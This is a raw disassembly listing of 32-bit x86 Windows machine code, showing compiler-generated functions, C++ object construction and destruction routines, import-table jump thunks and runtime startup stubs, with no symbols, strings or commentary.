  411538:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  41153b:	e8 10 04 00 00       	call   0x411950
  411540:	5b                   	pop    %ebx
  411541:	8b e5                	mov    %ebp,%esp
  411543:	5d                   	pop    %ebp
  411544:	c3                   	ret
  411545:	55                   	push   %ebp
  411546:	8b ec                	mov    %esp,%ebp
  411548:	83 ec 30             	sub    $0x30,%esp
  41154b:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  411552:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  411559:	c7 45 d8 00 00 00 00 	movl   $0x0,-0x28(%ebp)
  411560:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  411567:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  41156e:	6a 00                	push   $0x0
  411570:	6a 00                	push   $0x0
  411572:	6a 00                	push   $0x0
  411574:	6a 00                	push   $0x0
  411576:	ff 15 40 80 41 00    	call   *0x418040
  41157c:	6a 00                	push   $0x0
  41157e:	ff 15 2c 81 41 00    	call   *0x41812c
  411584:	6a 66                	push   $0x66
  411586:	6a 00                	push   $0x0
  411588:	ff 15 34 81 41 00    	call   *0x418134
  41158e:	66 c7 45 dc 16 00    	movw   $0x16,-0x24(%ebp)
  411594:	0f b7 45 dc          	movzwl -0x24(%ebp),%eax
  411598:	85 c0                	test   %eax,%eax
  41159a:	74 1b                	je     0x4115b7
  41159c:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  41159f:	51                   	push   %ecx
  4115a0:	ff 15 24 80 41 00    	call   *0x418024
  4115a6:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4115a9:	52                   	push   %edx
  4115aa:	e8 06 fd ff ff       	call   0x4112b5
  4115af:	83 c4 04             	add    $0x4,%esp
  4115b2:	e8 c7 fd ff ff       	call   0x41137e
  4115b7:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4115ba:	50                   	push   %eax
  4115bb:	6a 00                	push   $0x0
  4115bd:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4115c0:	51                   	push   %ecx
  4115c1:	6a 01                	push   $0x1
  4115c3:	6a 00                	push   $0x0
  4115c5:	ff 15 14 81 41 00    	call   *0x418114
  4115cb:	6a 03                	push   $0x3
  4115cd:	6a 00                	push   $0x0
  4115cf:	6a 00                	push   $0x0
  4115d1:	8b 55 d8             	mov    -0x28(%ebp),%edx
  4115d4:	52                   	push   %edx
  4115d5:	ff 15 28 81 41 00    	call   *0x418128
  4115db:	ff 15 3c 80 41 00    	call   *0x41803c
  4115e1:	68 96 00 00 00       	push   $0x96
  4115e6:	e8 28 05 00 00       	call   0x411b13
  4115eb:	83 c4 04             	add    $0x4,%esp
  4115ee:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4115f1:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4115f4:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4115f7:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4115fa:	c6 01 00             	movb   $0x0,(%ecx)
  4115fd:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  411601:	74 08                	je     0x41160b
  411603:	6a 00                	push   $0x0
  411605:	ff 15 38 80 41 00    	call   *0x418038
  41160b:	8b 55 f8             	mov    -0x8(%ebp),%edx
  41160e:	89 55 d0             	mov    %edx,-0x30(%ebp)
  411611:	8b 45 d0             	mov    -0x30(%ebp),%eax
  411614:	50                   	push   %eax
  411615:	e8 f4 04 00 00       	call   0x411b0e
  41161a:	83 c4 04             	add    $0x4,%esp
  41161d:	33 c0                	xor    %eax,%eax
  41161f:	8b e5                	mov    %ebp,%esp
  411621:	5d                   	pop    %ebp
  411622:	c2 10 00             	ret    $0x10
  411625:	cc                   	int3
  411626:	cc                   	int3
  411627:	cc                   	int3
  411628:	cc                   	int3
  411629:	cc                   	int3
  41162a:	cc                   	int3
  41162b:	cc                   	int3
  41162c:	cc                   	int3
  41162d:	cc                   	int3
  41162e:	cc                   	int3
  41162f:	cc                   	int3
  411630:	55                   	push   %ebp
  411631:	8b ec                	mov    %esp,%ebp
  411633:	51                   	push   %ecx
  411634:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  411637:	8b 45 fc             	mov    -0x4(%ebp),%eax
  41163a:	8b 4d 08             	mov    0x8(%ebp),%ecx
  41163d:	89 08                	mov    %ecx,(%eax)
  41163f:	8b 55 fc             	mov    -0x4(%ebp),%edx
  411642:	8b 45 0c             	mov    0xc(%ebp),%eax
  411645:	89 42 04             	mov    %eax,0x4(%edx)
  411648:	8b 45 fc             	mov    -0x4(%ebp),%eax
  41164b:	8b e5                	mov    %ebp,%esp
  41164d:	5d                   	pop    %ebp
  41164e:	c2 08 00             	ret    $0x8
  411651:	cc                   	int3
  411652:	cc                   	int3
  411653:	cc                   	int3
  411654:	cc                   	int3
  411655:	cc                   	int3
  411656:	cc                   	int3
  411657:	cc                   	int3
  411658:	cc                   	int3
  411659:	cc                   	int3
  41165a:	cc                   	int3
  41165b:	cc                   	int3
  41165c:	cc                   	int3
  41165d:	cc                   	int3
  41165e:	cc                   	int3
  41165f:	cc                   	int3
  411660:	55                   	push   %ebp
  411661:	8b ec                	mov    %esp,%ebp
  411663:	51                   	push   %ecx
  411664:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  411667:	8a 45 14             	mov    0x14(%ebp),%al
  41166a:	50                   	push   %eax
  41166b:	8a 4d 10             	mov    0x10(%ebp),%cl
  41166e:	51                   	push   %ecx
  41166f:	8a 55 0c             	mov    0xc(%ebp),%dl
  411672:	52                   	push   %edx
  411673:	8a 45 08             	mov    0x8(%ebp),%al
  411676:	50                   	push   %eax
  411677:	e8 14 00 00 00       	call   0x411690
  41167c:	83 c4 10             	add    $0x10,%esp
  41167f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  411682:	89 01                	mov    %eax,(%ecx)
  411684:	8b 45 fc             	mov    -0x4(%ebp),%eax
  411687:	8b e5                	mov    %ebp,%esp
  411689:	5d                   	pop    %ebp
  41168a:	c2 10 00             	ret    $0x10
  41168d:	cc                   	int3
  41168e:	cc                   	int3
  41168f:	cc                   	int3
  411690:	55                   	push   %ebp
  411691:	8b ec                	mov    %esp,%ebp
  411693:	0f b6 45 14          	movzbl 0x14(%ebp),%eax
  411697:	0f b6 4d 10          	movzbl 0x10(%ebp),%ecx
  41169b:	c1 e1 08             	shl    $0x8,%ecx
  41169e:	0b c1                	or     %ecx,%eax
  4116a0:	0f b6 55 0c          	movzbl 0xc(%ebp),%edx
  4116a4:	c1 e2 10             	shl    $0x10,%edx
  4116a7:	0b c2                	or     %edx,%eax
  4116a9:	0f b6 4d 08          	movzbl 0x8(%ebp),%ecx
  4116ad:	c1 e1 18             	shl    $0x18,%ecx
  4116b0:	0b c1                	or     %ecx,%eax
  4116b2:	5d                   	pop    %ebp
  4116b3:	c3                   	ret
  4116b4:	cc                   	int3
  4116b5:	cc                   	int3
  4116b6:	cc                   	int3
  4116b7:	cc                   	int3
  4116b8:	cc                   	int3
  4116b9:	cc                   	int3
  4116ba:	cc                   	int3
  4116bb:	cc                   	int3
  4116bc:	cc                   	int3
  4116bd:	cc                   	int3
  4116be:	cc                   	int3
  4116bf:	cc                   	int3
  4116c0:	55                   	push   %ebp
  4116c1:	8b ec                	mov    %esp,%ebp
  4116c3:	83 ec 08             	sub    $0x8,%esp
  4116c6:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4116c9:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4116cc:	e8 df 00 00 00       	call   0x4117b0
  4116d1:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4116d4:	c7 00 70 81 41 00    	movl   $0x418170,(%eax)
  4116da:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4116e1:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  4116e4:	51                   	push   %ecx
  4116e5:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4116e8:	e8 23 00 00 00       	call   0x411710
  4116ed:	50                   	push   %eax
  4116ee:	e8 83 03 00 00       	call   0x411a76
  4116f3:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4116f6:	89 42 08             	mov    %eax,0x8(%edx)
  4116f9:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4116fc:	50                   	push   %eax
  4116fd:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  411700:	e8 0b 01 00 00       	call   0x411810
  411705:	8b 45 f8             	mov    -0x8(%ebp),%eax
  411708:	8b e5                	mov    %ebp,%esp
  41170a:	5d                   	pop    %ebp
  41170b:	c2 04 00             	ret    $0x4
  41170e:	cc                   	int3
  41170f:	cc                   	int3
  411710:	55                   	push   %ebp
  411711:	8b ec                	mov    %esp,%ebp
  411713:	51                   	push   %ecx
  411714:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  411717:	8b 45 fc             	mov    -0x4(%ebp),%eax
  41171a:	8b 00                	mov    (%eax),%eax
  41171c:	8b e5                	mov    %ebp,%esp
  41171e:	5d                   	pop    %ebp
  41171f:	c3                   	ret
  411720:	55                   	push   %ebp
  411721:	8b ec                	mov    %esp,%ebp
  411723:	83 ec 14             	sub    $0x14,%esp
  411726:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  411729:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  411730:	8d 45 f8             	lea    -0x8(%ebp),%eax
  411733:	50                   	push   %eax
  411734:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  411737:	8b 51 04             	mov    0x4(%ecx),%edx
  41173a:	52                   	push   %edx
  41173b:	e8 42 03 00 00       	call   0x411a82
  411740:	50                   	push   %eax
  411741:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  411744:	e8 e7 00 00 00       	call   0x411830
  411749:	6a 0c                	push   $0xc
  41174b:	e8 50 00 00 00       	call   0x4117a0
  411750:	83 c4 04             	add    $0x4,%esp
  411753:	89 45 f4             	mov    %eax,-0xc(%ebp)
  411756:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  41175a:	74 18                	je     0x411774
  41175c:	8b 45 f0             	mov    -0x10(%ebp),%eax
  41175f:	8b 48 08             	mov    0x8(%eax),%ecx
  411762:	51                   	push   %ecx
  411763:	8b 55 f8             	mov    -0x8(%ebp),%edx
  411766:	52                   	push   %edx
  411767:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  41176a:	e8 71 00 00 00       	call   0x4117e0
  41176f:	89 45 ec             	mov    %eax,-0x14(%ebp)
  411772:	eb 07                	jmp    0x41177b
  411774:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  41177b:	8b 45 ec             	mov    -0x14(%ebp),%eax
  41177e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  411781:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  411785:	75 09                	jne    0x411790
  411787:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  41178a:	51                   	push   %ecx
  41178b:	e8 ec 02 00 00       	call   0x411a7c
  411790:	8b 45 fc             	mov    -0x4(%ebp),%eax
  411793:	8b e5                	mov    %ebp,%esp
  411795:	5d                   	pop    %ebp
  411796:	c3                   	ret
  411797:	cc                   	int3
  411798:	cc                   	int3
  411799:	cc                   	int3
  41179a:	cc                   	int3
  41179b:	cc                   	int3
  41179c:	cc                   	int3
  41179d:	cc                   	int3
  41179e:	cc                   	int3
  41179f:	cc                   	int3
  4117a0:	55                   	push   %ebp
  4117a1:	8b ec                	mov    %esp,%ebp
  4117a3:	8b 45 08             	mov    0x8(%ebp),%eax
  4117a6:	50                   	push   %eax
  4117a7:	e8 dc 02 00 00       	call   0x411a88
  4117ac:	5d                   	pop    %ebp
  4117ad:	c3                   	ret
  4117ae:	cc                   	int3
  4117af:	cc                   	int3
  4117b0:	55                   	push   %ebp
  4117b1:	8b ec                	mov    %esp,%ebp
  4117b3:	51                   	push   %ecx
  4117b4:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4117b7:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4117ba:	c7 00 78 81 41 00    	movl   $0x418178,(%eax)
  4117c0:	6a 06                	push   $0x6
  4117c2:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4117c5:	e8 66 00 00 00       	call   0x411830
  4117ca:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4117cd:	8b e5                	mov    %ebp,%esp
  4117cf:	5d                   	pop    %ebp
  4117d0:	c3                   	ret
  4117d1:	cc                   	int3
  4117d2:	cc                   	int3
  4117d3:	cc                   	int3
  4117d4:	cc                   	int3
  4117d5:	cc                   	int3
  4117d6:	cc                   	int3
  4117d7:	cc                   	int3
  4117d8:	cc                   	int3
  4117d9:	cc                   	int3
  4117da:	cc                   	int3
  4117db:	cc                   	int3
  4117dc:	cc                   	int3
  4117dd:	cc                   	int3
  4117de:	cc                   	int3
  4117df:	cc                   	int3
  4117e0:	55                   	push   %ebp
  4117e1:	8b ec                	mov    %esp,%ebp
  4117e3:	51                   	push   %ecx
  4117e4:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4117e7:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4117ea:	c7 00 78 81 41 00    	movl   $0x418178,(%eax)
  4117f0:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4117f3:	8b 55 0c             	mov    0xc(%ebp),%edx
  4117f6:	89 51 08             	mov    %edx,0x8(%ecx)
  4117f9:	8b 45 08             	mov    0x8(%ebp),%eax
  4117fc:	50                   	push   %eax
  4117fd:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  411800:	e8 0b 00 00 00       	call   0x411810
  411805:	8b 45 fc             	mov    -0x4(%ebp),%eax
  411808:	8b e5                	mov    %ebp,%esp
  41180a:	5d                   	pop    %ebp
  41180b:	c2 08 00             	ret    $0x8
  41180e:	cc                   	int3
  41180f:	cc                   	int3
  411810:	55                   	push   %ebp
  411811:	8b ec                	mov    %esp,%ebp
  411813:	51                   	push   %ecx
  411814:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  411817:	8b 45 fc             	mov    -0x4(%ebp),%eax
  41181a:	8b 4d 08             	mov    0x8(%ebp),%ecx
  41181d:	89 48 04             	mov    %ecx,0x4(%eax)
  411820:	8b e5                	mov    %ebp,%esp
  411822:	5d                   	pop    %ebp
  411823:	c2 04 00             	ret    $0x4
  411826:	cc                   	int3
  411827:	cc                   	int3
  411828:	cc                   	int3
  411829:	cc                   	int3
  41182a:	cc                   	int3
  41182b:	cc                   	int3
  41182c:	cc                   	int3
  41182d:	cc                   	int3
  41182e:	cc                   	int3
  41182f:	cc                   	int3
  411830:	55                   	push   %ebp
  411831:	8b ec                	mov    %esp,%ebp
  411833:	51                   	push   %ecx
  411834:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  411837:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  41183b:	74 0e                	je     0x41184b
  41183d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  411840:	8b 4d 08             	mov    0x8(%ebp),%ecx
  411843:	89 48 08             	mov    %ecx,0x8(%eax)
  411846:	8b 45 08             	mov    0x8(%ebp),%eax
  411849:	eb 03                	jmp    0x41184e
  41184b:	8b 45 08             	mov    0x8(%ebp),%eax
  41184e:	8b e5                	mov    %ebp,%esp
  411850:	5d                   	pop    %ebp
  411851:	c2 04 00             	ret    $0x4
  411854:	cc                   	int3
  411855:	cc                   	int3
  411856:	cc                   	int3
  411857:	cc                   	int3
  411858:	cc                   	int3
  411859:	cc                   	int3
  41185a:	cc                   	int3
  41185b:	cc                   	int3
  41185c:	cc                   	int3
  41185d:	cc                   	int3
  41185e:	cc                   	int3
  41185f:	cc                   	int3
  411860:	55                   	push   %ebp
  411861:	8b ec                	mov    %esp,%ebp
  411863:	51                   	push   %ecx
  411864:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  411867:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  41186a:	e8 31 00 00 00       	call   0x4118a0
  41186f:	8b 45 08             	mov    0x8(%ebp),%eax
  411872:	83 e0 01             	and    $0x1,%eax
  411875:	85 c0                	test   %eax,%eax
  411877:	74 0c                	je     0x411885
  411879:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  41187c:	51                   	push   %ecx
  41187d:	e8 0e 00 00 00       	call   0x411890
  411882:	83 c4 04             	add    $0x4,%esp
  411885:	8b 45 fc             	mov    -0x4(%ebp),%eax
  411888:	8b e5                	mov    %ebp,%esp
  41188a:	5d                   	pop    %ebp
  41188b:	c2 04 00             	ret    $0x4
  41188e:	cc                   	int3
  41188f:	cc                   	int3
  411890:	55                   	push   %ebp
  411891:	8b ec                	mov    %esp,%ebp
  411893:	8b 45 08             	mov    0x8(%ebp),%eax
  411896:	50                   	push   %eax
  411897:	e8 f2 01 00 00       	call   0x411a8e
  41189c:	5d                   	pop    %ebp
  41189d:	c3                   	ret
  41189e:	cc                   	int3
  41189f:	cc                   	int3
  4118a0:	55                   	push   %ebp
  4118a1:	8b ec                	mov    %esp,%ebp
  4118a3:	51                   	push   %ecx
  4118a4:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4118a7:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4118aa:	c7 00 78 81 41 00    	movl   $0x418178,(%eax)
  4118b0:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4118b3:	8b 51 04             	mov    0x4(%ecx),%edx
  4118b6:	52                   	push   %edx
  4118b7:	e8 c0 01 00 00       	call   0x411a7c
  4118bc:	8b e5                	mov    %ebp,%esp
  4118be:	5d                   	pop    %ebp
  4118bf:	c3                   	ret
  4118c0:	55                   	push   %ebp
  4118c1:	8b ec                	mov    %esp,%ebp
  4118c3:	51                   	push   %ecx
  4118c4:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4118c7:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4118ca:	e8 21 00 00 00       	call   0x4118f0
  4118cf:	8b 45 08             	mov    0x8(%ebp),%eax
  4118d2:	83 e0 01             	and    $0x1,%eax
  4118d5:	85 c0                	test   %eax,%eax
  4118d7:	74 0c                	je     0x4118e5
  4118d9:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4118dc:	51                   	push   %ecx
  4118dd:	e8 ae ff ff ff       	call   0x411890
  4118e2:	83 c4 04             	add    $0x4,%esp
  4118e5:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4118e8:	8b e5                	mov    %ebp,%esp
  4118ea:	5d                   	pop    %ebp
  4118eb:	c2 04 00             	ret    $0x4
  4118ee:	cc                   	int3
  4118ef:	cc                   	int3
  4118f0:	55                   	push   %ebp
  4118f1:	8b ec                	mov    %esp,%ebp
  4118f3:	51                   	push   %ecx
  4118f4:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4118f7:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4118fa:	e8 a1 ff ff ff       	call   0x4118a0
  4118ff:	8b e5                	mov    %ebp,%esp
  411901:	5d                   	pop    %ebp
  411902:	c3                   	ret
  411903:	cc                   	int3
  411904:	cc                   	int3
  411905:	cc                   	int3
  411906:	cc                   	int3
  411907:	cc                   	int3
  411908:	cc                   	int3
  411909:	cc                   	int3
  41190a:	cc                   	int3
  41190b:	cc                   	int3
  41190c:	cc                   	int3
  41190d:	cc                   	int3
  41190e:	cc                   	int3
  41190f:	cc                   	int3
  411910:	55                   	push   %ebp
  411911:	8b ec                	mov    %esp,%ebp
  411913:	83 ec 08             	sub    $0x8,%esp
  411916:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  411919:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  411920:	8d 45 fc             	lea    -0x4(%ebp),%eax
  411923:	50                   	push   %eax
  411924:	8b 4d 08             	mov    0x8(%ebp),%ecx
  411927:	51                   	push   %ecx
  411928:	e8 67 01 00 00       	call   0x411a94
  41192d:	8b 55 f8             	mov    -0x8(%ebp),%edx
  411930:	89 42 04             	mov    %eax,0x4(%edx)
  411933:	8b 45 fc             	mov    -0x4(%ebp),%eax
  411936:	50                   	push   %eax
  411937:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  41193a:	e8 31 00 00 00       	call   0x411970
  41193f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  411942:	8b e5                	mov    %ebp,%esp
  411944:	5d                   	pop    %ebp
  411945:	c2 04 00             	ret    $0x4
  411948:	cc                   	int3
  411949:	cc                   	int3
  41194a:	cc                   	int3
  41194b:	cc                   	int3
  41194c:	cc                   	int3
  41194d:	cc                   	int3
  41194e:	cc                   	int3
  41194f:	cc                   	int3
  411950:	55                   	push   %ebp
  411951:	8b ec                	mov    %esp,%ebp
  411953:	51                   	push   %ecx
  411954:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  411957:	8b 45 fc             	mov    -0x4(%ebp),%eax
  41195a:	8b 08                	mov    (%eax),%ecx
  41195c:	51                   	push   %ecx
  41195d:	e8 38 01 00 00       	call   0x411a9a
  411962:	8b e5                	mov    %ebp,%esp
  411964:	5d                   	pop    %ebp
  411965:	c3                   	ret
  411966:	cc                   	int3
  411967:	cc                   	int3
  411968:	cc                   	int3
  411969:	cc                   	int3
  41196a:	cc                   	int3
  41196b:	cc                   	int3
  41196c:	cc                   	int3
  41196d:	cc                   	int3
  41196e:	cc                   	int3
  41196f:	cc                   	int3
  411970:	55                   	push   %ebp
  411971:	8b ec                	mov    %esp,%ebp
  411973:	51                   	push   %ecx
  411974:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  411977:	8b 45 fc             	mov    -0x4(%ebp),%eax
  41197a:	8b 4d 08             	mov    0x8(%ebp),%ecx
  41197d:	89 08                	mov    %ecx,(%eax)
  41197f:	8b e5                	mov    %ebp,%esp
  411981:	5d                   	pop    %ebp
  411982:	c2 04 00             	ret    $0x4
  411985:	cc                   	int3
  411986:	cc                   	int3
  411987:	cc                   	int3
  411988:	cc                   	int3
  411989:	cc                   	int3
  41198a:	cc                   	int3
  41198b:	cc                   	int3
  41198c:	cc                   	int3
  41198d:	cc                   	int3
  41198e:	cc                   	int3
  41198f:	cc                   	int3
  411990:	55                   	push   %ebp
  411991:	8b ec                	mov    %esp,%ebp
  411993:	83 ec 08             	sub    $0x8,%esp
  411996:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  411999:	8b 45 fc             	mov    -0x4(%ebp),%eax
  41199c:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  4119a2:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  4119a6:	74 0b                	je     0x4119b3
  4119a8:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4119ab:	8b 51 04             	mov    0x4(%ecx),%edx
  4119ae:	89 55 f8             	mov    %edx,-0x8(%ebp)
  4119b1:	eb 07                	jmp    0x4119ba
  4119b3:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  4119ba:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4119bd:	50                   	push   %eax
  4119be:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4119c1:	51                   	push   %ecx
  4119c2:	8b 55 08             	mov    0x8(%ebp),%edx
  4119c5:	52                   	push   %edx
  4119c6:	e8 d5 00 00 00       	call   0x411aa0
  4119cb:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4119ce:	89 41 04             	mov    %eax,0x4(%ecx)
  4119d1:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4119d4:	8b e5                	mov    %ebp,%esp
  4119d6:	5d                   	pop    %ebp
  4119d7:	c2 08 00             	ret    $0x8
  4119da:	cc                   	int3
  4119db:	cc                   	int3
  4119dc:	cc                   	int3
  4119dd:	cc                   	int3
  4119de:	cc                   	int3
  4119df:	cc                   	int3
  4119e0:	55                   	push   %ebp
  4119e1:	8b ec                	mov    %esp,%ebp
  4119e3:	51                   	push   %ecx
  4119e4:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4119e7:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4119ea:	8b 08                	mov    (%eax),%ecx
  4119ec:	51                   	push   %ecx
  4119ed:	e8 b4 00 00 00       	call   0x411aa6
  4119f2:	8b e5                	mov    %ebp,%esp
  4119f4:	5d                   	pop    %ebp
  4119f5:	c3                   	ret
  4119f6:	cc                   	int3
  4119f7:	cc                   	int3
  4119f8:	cc                   	int3
  4119f9:	cc                   	int3
  4119fa:	cc                   	int3
  4119fb:	cc                   	int3
  4119fc:	cc                   	int3
  4119fd:	cc                   	int3
  4119fe:	cc                   	int3
  4119ff:	cc                   	int3
  411a00:	55                   	push   %ebp
  411a01:	8b ec                	mov    %esp,%ebp
  411a03:	83 ec 0c             	sub    $0xc,%esp
  411a06:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  411a09:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  411a10:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  411a14:	74 0a                	je     0x411a20
  411a16:	8b 45 08             	mov    0x8(%ebp),%eax
  411a19:	8b 08                	mov    (%eax),%ecx
  411a1b:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  411a1e:	eb 07                	jmp    0x411a27
  411a20:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  411a27:	8d 55 fc             	lea    -0x4(%ebp),%edx
  411a2a:	52                   	push   %edx
  411a2b:	8b 45 14             	mov    0x14(%ebp),%eax
  411a2e:	50                   	push   %eax
  411a2f:	8b 4d 10             	mov    0x10(%ebp),%ecx
  411a32:	51                   	push   %ecx
  411a33:	8b 55 0c             	mov    0xc(%ebp),%edx
  411a36:	52                   	push   %edx
  411a37:	8b 45 f4             	mov    -0xc(%ebp),%eax
  411a3a:	50                   	push   %eax
  411a3b:	e8 6c 00 00 00       	call   0x411aac
  411a40:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  411a43:	89 41 04             	mov    %eax,0x4(%ecx)
  411a46:	8b 55 fc             	mov    -0x4(%ebp),%edx
  411a49:	52                   	push   %edx
  411a4a:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  411a4d:	e8 1e ff ff ff       	call   0x411970
  411a52:	8b 45 f8             	mov    -0x8(%ebp),%eax
  411a55:	8b e5                	mov    %ebp,%esp
  411a57:	5d                   	pop    %ebp
  411a58:	c2 10 00             	ret    $0x10
  411a5b:	cc                   	int3
  411a5c:	cc                   	int3
  411a5d:	cc                   	int3
  411a5e:	cc                   	int3
  411a5f:	cc                   	int3
  411a60:	55                   	push   %ebp
  411a61:	8b ec                	mov    %esp,%ebp
  411a63:	51                   	push   %ecx
  411a64:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  411a67:	8b 45 fc             	mov    -0x4(%ebp),%eax
  411a6a:	8b 08                	mov    (%eax),%ecx
  411a6c:	51                   	push   %ecx
  411a6d:	e8 40 00 00 00       	call   0x411ab2
  411a72:	8b e5                	mov    %ebp,%esp
  411a74:	5d                   	pop    %ebp
  411a75:	c3                   	ret
  411a76:	ff 25 68 81 41 00    	jmp    *0x418168
  411a7c:	ff 25 40 81 41 00    	jmp    *0x418140
  411a82:	ff 25 44 81 41 00    	jmp    *0x418144
  411a88:	ff 25 48 81 41 00    	jmp    *0x418148
  411a8e:	ff 25 4c 81 41 00    	jmp    *0x41814c
  411a94:	ff 25 50 81 41 00    	jmp    *0x418150
  411a9a:	ff 25 54 81 41 00    	jmp    *0x418154
  411aa0:	ff 25 58 81 41 00    	jmp    *0x418158
  411aa6:	ff 25 5c 81 41 00    	jmp    *0x41815c
  411aac:	ff 25 60 81 41 00    	jmp    *0x418160
  411ab2:	ff 25 64 81 41 00    	jmp    *0x418164
  411ab8:	ff 25 0c 81 41 00    	jmp    *0x41810c
  411abe:	c3                   	ret
  411abf:	b8 fe 20 41 00       	mov    $0x4120fe,%eax
  411ac4:	a3 68 60 45 00       	mov    %eax,0x456068
  411ac9:	c7 05 6c 60 45 00 78 	movl   $0x411d78,0x45606c
  411ad0:	1d 41 00 
  411ad3:	c7 05 70 60 45 00 dd 	movl   $0x411ddd,0x456070
  411ada:	1d 41 00 
  411add:	c7 05 74 60 45 00 3c 	movl   $0x411d3c,0x456074
  411ae4:	1d 41 00 
  411ae7:	c7 05 78 60 45 00 c3 	movl   $0x411dc3,0x456078
  411aee:	1d 41 00 
  411af1:	a3 7c 60 45 00       	mov    %eax,0x45607c
  411af6:	c3                   	ret
  411af7:	e8 c3 ff ff ff       	call   0x411abf
  411afc:	e8 a0 06 00 00       	call   0x4121a1
  411b01:	a3 78 6c 45 00       	mov    %eax,0x456c78
  411b06:	e8 44 06 00 00       	call   0x41214f
  411b0b:	db e2                	fnclex
  411b0d:	c3                   	ret
  411b0e:	e9 b7 06 00 00       	jmp    0x4121ca
  411b13:	6a 01                	push   $0x1
  411b15:	ff 74 24 08          	push   0x8(%esp)
  411b19:	e8 98 07 00 00       	call   0x4122b6
  411b1e:	59                   	pop    %ecx
  411b1f:	59                   	pop    %ecx
  411b20:	c3                   	ret
  411b21:	83 3d 84 6c 45 00 01 	cmpl   $0x1,0x456c84
  411b28:	75 05                	jne    0x411b2f
  411b2a:	e8 f6 0a 00 00       	call   0x412625
  411b2f:	ff 74 24 04          	push   0x4(%esp)
  411b33:	e8 76 09 00 00       	call   0x4124ae
  411b38:	68 ff 00 00 00       	push   $0xff
  411b3d:	ff 15 60 60 45 00    	call   *0x456060
  411b43:	59                   	pop    %ecx
  411b44:	59                   	pop    %ecx
  411b45:	c3                   	ret
  411b46:	83 3d 84 6c 45 00 01 	cmpl   $0x1,0x456c84
  411b4d:	75 05                	jne    0x411b54
  411b4f:	e8 d1 0a 00 00       	call   0x412625
  411b54:	ff 74 24 04          	push   0x4(%esp)
